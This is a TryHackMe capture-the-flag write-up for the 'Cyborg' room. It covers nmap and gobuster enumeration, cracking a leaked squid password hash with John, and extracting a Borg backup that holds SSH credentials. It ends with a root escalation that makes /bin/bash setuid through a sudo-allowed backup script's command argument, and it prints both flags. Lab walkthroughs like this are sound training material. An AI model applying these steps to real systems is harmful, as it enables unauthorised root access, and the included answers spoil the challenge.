## Cyborg - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/cyborgt8)

<i>Please deploy the machine so you can get started. Please allow a few minutes to make sure all the services boot up. Good luck!

twitter: fieldraccoon

Compromise the machine and read the user.txt and root.txt</i>

**IP: 10.10.107.57**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Gobuster, John, Borg<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.107.57

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
  |   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
  |_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.107.57/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /admin                (Status: 301) [Size: 312] [--> http://10.10.107.57/admin/]
  /etc                  (Status: 301) [Size: 310] [--> http://10.10.107.57/etc/]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- Visit `http://10.10.107.57/etc/squid/passwd` and get the credentials. Crack the hash with `John`.

  ```
  music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

  john --wordlist=/rockyou.txt hash.txt                    
  Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
  Use the "--format=md5crypt-long" option to force loading these as that type instead
  Using default input encoding: UTF-8
  Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  squidward        (?)     
  1g 0:00:00:00 DONE (2025-05-16 20:28) 5.555g/s 216533p/s 216533c/s 216533C/s 112806..samantha5
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed. 
  ```
  
- After exploring the main web page I downloaded `archive.tar` and extracted it. I spend some time trying to get my way around it but couldn't do it. Well, one of the files contains message `https://borgbackup.readthedocs.io/`.

- I visited that link and it's actually a tool that will extract directory with hidden password. Exactly what we need! Install the tool and use this basic syntax `borg extract /path/to/directory::my-files`.

  ```
  sudo apt install borgbackup

  /home/field/dev
  borg extract final_archive::music_archive
  Enter passphrase for key ../Cyborg/home/field/dev/final_archive:

  ls
  final_archive  home
  ```

- We found the passphrase with `john`, you can also use the full path with `borg`. Now you should have access to `alex` repository. There's a secret in `Desktop` and note in `Documents`.

  ```
  field/dev/home/alex/Desktop
  cat secret.txt     
  shoutout to all the people who have gotten to this stage whoop whoop!"
  
  field/dev/home/alex/Documents
  cat note.txt  
  Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
  
  alex:S3cretP@s3
  ```

- Beautiful, now we have SSH credentials, you know what to do.

---

## 🧍 User Privilege Escalation

- First flag is already there waiting for you.

  ```
  alex@ubuntu:~$ pwd
  /home/alex
  
  alex@ubuntu:~$ ls -al
  total 108
  drwx------ 17 alex alex 4096 Dec 31  2020 .
  drwxr-xr-x  3 root root 4096 Dec 30  2020 ..
  -rw-------  1 alex alex 1145 Dec 31  2020 .bash_history
  -rw-r--r--  1 alex alex  220 Dec 30  2020 .bash_logout
  -rw-r--r--  1 alex alex 3771 Dec 30  2020 .bashrc
  drwx------ 13 alex alex 4096 May 16 12:49 .cache
  drwx------  3 alex alex 4096 Dec 30  2020 .compiz
  drwx------ 15 alex alex 4096 Dec 30  2020 .config
  drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Desktop
  -rw-r--r--  1 alex alex   25 Dec 30  2020 .dmrc
  drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Documents
  drwxr-xr-x  2 alex alex 4096 Dec 31  2020 Downloads
  drwx------  2 alex alex 4096 Dec 30  2020 .gconf
  drwx------  3 alex alex 4096 Dec 31  2020 .gnupg
  -rw-------  1 alex alex 1590 Dec 31  2020 .ICEauthority
  drwx------  3 alex alex 4096 Dec 30  2020 .local
  drwx------  5 alex alex 4096 Dec 30  2020 .mozilla
  drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Music
  drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Pictures
  -rw-r--r--  1 alex alex  655 Dec 30  2020 .profile
  drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Public
  -rw-r--r--  1 alex alex    0 Dec 30  2020 .sudo_as_admin_successful
  drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Templates
  -r-xr--r--  1 alex alex   40 Dec 30  2020 user.txt
  drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Videos
  -rw-------  1 alex alex   51 Dec 31  2020 .Xauthority
  -rw-------  1 alex alex   82 Dec 31  2020 .xsession-errors
  -rw-------  1 alex alex   82 Dec 31  2020 .xsession-errors.old
  
  alex@ubuntu:~$ cat user.txt 
  flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
  ```
  
- Let's escalate now.

---

## 👑 Root Privilege Escalation

- I checked sudo privileges first as always and found a fishy file.

  ```
  alex@ubuntu:~$ sudo -l
  Matching Defaults entries for alex on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User alex may run the following commands on ubuntu:
      (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
  
  alex@ubuntu:~$ ls -al /etc/mp3backups/backup.sh 
  -r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
  ```

- We have privileges to read and execute that file so let's check what it does.

  ```
  alex@ubuntu:~$ cat /etc/mp3backups/backup.sh 
  #!/bin/bash
  
  sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt
  
  
  input="/etc/mp3backups/backed_up_files.txt"
  #while IFS= read -r line
  #do
    #a="/etc/mp3backups/backed_up_files.txt"
  #  b=$(basename $input)
    #echo
  #  echo "$line"
  #done < "$input"
  
  while getopts c: flag
  do
          case "${flag}" in 
                  c) command=${OPTARG};;
          esac
  done
  
  
  
  backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"
  
  # Where to backup to.
  dest="/etc/mp3backups/"
  
  # Create archive filename.
  hostname=$(hostname -s)
  archive_file="$hostname-scheduled.tgz"
  
  # Print start status message.
  echo "Backing up $backup_files to $dest/$archive_file"
  
  echo
  
  # Backup the files using tar.
  tar czf $dest/$archive_file $backup_files
  
  # Print end status message.
  echo
  echo "Backup finished"
  
  cmd=$($command)
  echo $cmd
  ```

- OK, it's a pretty solid script for making backups, but there's one part of the script that we can abuse. Script will run anyway without any arguments, but we can also add arguments with `-c <command>` and execute different commands.
  I tested it with simple `whoami` command and it worked.

  ```
  alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c whoami
  find: ‘/run/user/108/gvfs’: Permission denied
  /home/alex/Music/image12.mp3
  /home/alex/Music/image7.mp3
  /home/alex/Music/image1.mp3
  /home/alex/Music/image10.mp3
  /home/alex/Music/image5.mp3
  /home/alex/Music/image4.mp3
  /home/alex/Music/image3.mp3
  /home/alex/Music/image6.mp3
  /home/alex/Music/image8.mp3
  /home/alex/Music/image9.mp3
  /home/alex/Music/image11.mp3
  /home/alex/Music/image2.mp3
  Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz
  
  tar: Removing leading `/' from member names
  tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
  tar: Exiting with failure status due to previous errors
  
  Backup finished
  root
  ```

- Perfect, it also runs as root which is ideal. Next I tried `-c cat /root/root.txt` but then the whole script crashed... So let's execute bash and get to root.

  ```
  alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"

  find: ‘/run/user/108/gvfs’: Permission denied
  /home/alex/Music/image12.mp3
  /home/alex/Music/image7.mp3
  /home/alex/Music/image1.mp3
  /home/alex/Music/image10.mp3
  /home/alex/Music/image5.mp3
  /home/alex/Music/image4.mp3
  /home/alex/Music/image3.mp3
  /home/alex/Music/image6.mp3
  /home/alex/Music/image8.mp3
  /home/alex/Music/image9.mp3
  /home/alex/Music/image11.mp3
  /home/alex/Music/image2.mp3
  Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz
  
  tar: Removing leading `/' from member names
  tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
  tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
  tar: Exiting with failure status due to previous errors
  
  Backup finished
  ```

- Now finish the job.

  ```
  alex@ubuntu:~$ bash -p
  bash-4.3# whoami
  root
  bash-4.3# cat /root/root.txt
  flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
  ```

---

## 🏁 Flags

- **User Flag**: `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`
- **Root Flag**: `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Extracting hidden repo since I needed new tool for that, this privilege escalation was also new to me.`

- What did I learn?
  `New tool and new exploitation method.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
